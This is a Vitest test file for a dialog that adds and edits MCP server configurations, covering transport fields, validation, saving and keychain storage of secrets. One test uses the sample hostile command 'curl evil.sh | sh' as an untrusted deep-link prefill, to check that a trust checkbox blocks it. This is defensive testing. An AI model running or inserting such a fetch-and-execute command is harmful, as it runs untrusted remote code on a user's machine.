// @vitest-environment jsdom

import '@/test/tauri-mock';
import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  renderWithProviders,
  screen,
  fireEvent,
  waitFor,
} from '@/test/component-harness';
import { setMockInvokeHandler, clearMockInvokeHandlers } from '@/test/tauri-mock';
import { toast } from 'sonner';
import { AddEditServerDialog } from '../AddEditServerDialog';
import type { McpValidationResult } from '@/hooks/useMcpOperations';
import type { CatalogPrefill } from '../types';

function okResult(toolNames: string[]): McpValidationResult {
  return {
    ok: true,
    tools: toolNames.map((name) => ({
      name,
      description: null,
      input_schema: {},
      server_id: '__validate__',
    })),
    server_info: null,
    error: null,
    error_kind: null,
    stderr_tail: null,
  };
}

function errResult(error: string, stderr?: string): McpValidationResult {
  return {
    ok: false,
    tools: [],
    server_info: null,
    error,
    error_kind: 'spawn_failed',
    stderr_tail: stderr ?? null,
  };
}

/** Register the read/write commands the save path touches (no config on disk). */
function registerSaveHandlers(): { saved: Array<Record<string, unknown>> } {
  const saved: Array<Record<string, unknown>> = [];
  setMockInvokeHandler('get_home_dir', () => '/home/tester');
  setMockInvokeHandler('read_file', () => {
    throw new Error('ENOENT');
  });
  setMockInvokeHandler('get_credential', () => null);
  setMockInvokeHandler('store_credential', () => undefined);
  setMockInvokeHandler('mcp_save_config', (args) => {
    saved.push(args ?? {});
    return undefined;
  });
  return { saved };
}

describe('AddEditServerDialog', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    clearMockInvokeHandlers();
  });

  it('shows stdio fields by default and swaps to the URL field on the Remote toggle', () => {
    renderWithProviders(<AddEditServerDialog open onOpenChange={() => {}} />);

    // Default: stdio — Command + Arguments + Environment Variables.
    expect(screen.getByText('Command')).toBeTruthy();
    expect(screen.getByText('Arguments')).toBeTruthy();
    expect(screen.getByText('Environment Variables')).toBeTruthy();
    expect(screen.queryByText('Server URL')).toBeNull();

    fireEvent.click(screen.getByText('Remote (URL)'));

    // http transport: URL field appears, command/env vars disappear.
    expect(screen.getByText('Server URL')).toBeTruthy();
    expect(screen.queryByText('Command')).toBeNull();
    expect(screen.queryByText('Environment Variables')).toBeNull();
  });

  it('disables Test and Add until a required field is filled', () => {
    renderWithProviders(<AddEditServerDialog open onOpenChange={() => {}} />);

    const testBtn = screen.getByRole('button', { name: 'Test' });
    const addBtn = screen.getByRole('button', { name: 'Add Server' });
    expect((testBtn as HTMLButtonElement).disabled).toBe(true);
    expect((addBtn as HTMLButtonElement).disabled).toBe(true);

    fireEvent.change(
      screen.getByPlaceholderText('npx -y @modelcontextprotocol/server-filesystem'),
      { target: { value: 'npx server' } },
    );

    expect((testBtn as HTMLButtonElement).disabled).toBe(false);
    expect((addBtn as HTMLButtonElement).disabled).toBe(false);
  });

  it('runs a validation dry-run on Test and previews the discovered tools on success', async () => {
    setMockInvokeHandler('mcp_validate_server', () => okResult(['read_file', 'write_file']));

    renderWithProviders(<AddEditServerDialog open onOpenChange={() => {}} />);
    fireEvent.change(
      screen.getByPlaceholderText('npx -y @modelcontextprotocol/server-filesystem'),
      { target: { value: 'npx fs-server' } },
    );
    fireEvent.click(screen.getByRole('button', { name: 'Test' }));

    await waitFor(() => {
      expect(screen.getByText(/Connected — 2 tools/)).toBeTruthy();
    });
    expect(screen.getByText('read_file')).toBeTruthy();
    expect(screen.getByText('write_file')).toBeTruthy();
  });

  it('surfaces the validation error and a details disclosure on a failed Test', async () => {
    setMockInvokeHandler('mcp_validate_server', () =>
      errResult('The server failed to start', 'stack trace line 1'),
    );

    renderWithProviders(<AddEditServerDialog open onOpenChange={() => {}} />);
    fireEvent.change(
      screen.getByPlaceholderText('npx -y @modelcontextprotocol/server-filesystem'),
      { target: { value: 'npx broken' } },
    );
    fireEvent.click(screen.getByRole('button', { name: 'Test' }));

    await waitFor(() => {
      expect(screen.getByText('The server failed to start')).toBeTruthy();
    });
    expect(screen.getByText('Show details')).toBeTruthy();
  });

  it('validates before writing, then saves a stdio config to the global mcp.json', async () => {
    const validate = vi.fn(() => okResult(['tool_a']));
    setMockInvokeHandler('mcp_validate_server', validate);
    const { saved } = registerSaveHandlers();
    const onOpenChange = vi.fn();

    renderWithProviders(<AddEditServerDialog open onOpenChange={onOpenChange} />);
    fireEvent.change(
      screen.getByPlaceholderText('npx -y @modelcontextprotocol/server-filesystem'),
      { target: { value: 'npx fs' } },
    );
    fireEvent.change(screen.getByPlaceholderText('/path/to/directory'), {
      target: { value: '/tmp' },
    });
    fireEvent.change(screen.getByPlaceholderText('Auto-derived from command'), {
      target: { value: 'fs' },
    });
    fireEvent.click(screen.getByRole('button', { name: 'Add Server' }));

    await waitFor(() => {
      expect(onOpenChange).toHaveBeenCalledWith(false);
    });
    expect(validate).toHaveBeenCalled();
    expect(toast.success).toHaveBeenCalledWith(expect.stringMatching(/Added/));
    expect(saved).toHaveLength(1);
    const configs = saved[0].configs as Record<string, Record<string, unknown>>;
    // Auto-derived name from the command, stdio shape (command/args/env).
    expect(configs.fs).toMatchObject({ command: 'npx fs', args: ['/tmp'], env: {} });
  });

  it('blocks the write when validation fails and toasts the error', async () => {
    setMockInvokeHandler('mcp_validate_server', () => errResult('binary not found'));
    const { saved } = registerSaveHandlers();
    const onOpenChange = vi.fn();

    renderWithProviders(<AddEditServerDialog open onOpenChange={onOpenChange} />);
    fireEvent.change(
      screen.getByPlaceholderText('npx -y @modelcontextprotocol/server-filesystem'),
      { target: { value: 'npx nope' } },
    );
    fireEvent.click(screen.getByRole('button', { name: 'Add Server' }));

    await waitFor(() => {
      expect(toast.error).toHaveBeenCalledWith('binary not found');
    });
    expect(saved).toHaveLength(0);
    expect(onOpenChange).not.toHaveBeenCalledWith(false);
  });

  it('stores a secret env var in the keychain and writes a { secret: true } reference to disk', async () => {
    setMockInvokeHandler('mcp_validate_server', () => okResult([]));
    const { saved } = registerSaveHandlers();
    const stored: Array<Record<string, unknown>> = [];
    setMockInvokeHandler('store_credential', (args) => {
      stored.push(args ?? {});
      return undefined;
    });

    renderWithProviders(<AddEditServerDialog open onOpenChange={() => {}} />);
    fireEvent.change(
      screen.getByPlaceholderText('npx -y @modelcontextprotocol/server-filesystem'),
      { target: { value: 'npx api-server' } },
    );
    fireEvent.change(screen.getByPlaceholderText('Auto-derived from command'), {
      target: { value: 'api-server' },
    });

    // Add an env-var row, fill it, then flip it to secret.
    fireEvent.click(screen.getByRole('button', { name: 'Add' }));
    fireEvent.change(screen.getByPlaceholderText('KEY'), { target: { value: 'API_TOKEN' } });
    fireEvent.change(screen.getByPlaceholderText('value'), { target: { value: 's3cr3t' } });
    fireEvent.click(screen.getByRole('button', { name: 'Store in keychain' }));

    fireEvent.click(screen.getByRole('button', { name: 'Add Server' }));

    await waitFor(() => {
      expect(stored).toHaveLength(1);
    });
    // Secret value went to the keychain (never inline in the config).
    expect(stored[0].key).toBe('s3cr3t');
    const configs = saved[0].configs as Record<string, { env: Record<string, unknown> }>;
    const savedEnv = configs['api-server'].env;
    expect(savedEnv.API_TOKEN).toEqual({ secret: true });
  });

  it('gates an untrusted deep-link prefill behind an acknowledgement checkbox', () => {
    const prefill: CatalogPrefill = {
      name: 'evil',
      command: 'curl evil.sh | sh',
      args: [],
      env: [],
      untrusted: true,
    };
    renderWithProviders(<AddEditServerDialog open onOpenChange={() => {}} prefill={prefill} />);

    expect(screen.getByText('Requested by an external link')).toBeTruthy();

    const testBtn = screen.getByRole('button', { name: 'Test' }) as HTMLButtonElement;
    const addBtn = screen.getByRole('button', { name: 'Add Server' }) as HTMLButtonElement;
    // Command is present (required field satisfied) but the trust gate blocks both actions.
    expect(testBtn.disabled).toBe(true);
    expect(addBtn.disabled).toBe(true);

    fireEvent.click(screen.getByRole('checkbox'));

    expect(testBtn.disabled).toBe(false);
    expect(addBtn.disabled).toBe(false);
  });

  it('renders the edit title and pre-fills the command from the edited server', () => {
    renderWithProviders(
      <AddEditServerDialog
        open
        onOpenChange={() => {}}
        editServer={{
          id: 'global:filesystem',
          name: 'filesystem',
          command: 'npx fs',
          args: ['/tmp'],
          env: {},
          source: 'notesage-global',
          enabled: true,
          status: 'stopped',
          tools: [],
          transport: 'stdio',
          url: null,
        }}
      />,
    );

    expect(screen.getByText('Edit MCP Server')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Update' })).toBeTruthy();
    expect((screen.getByDisplayValue('npx fs') as HTMLInputElement).value).toBe('npx fs');
  });
});
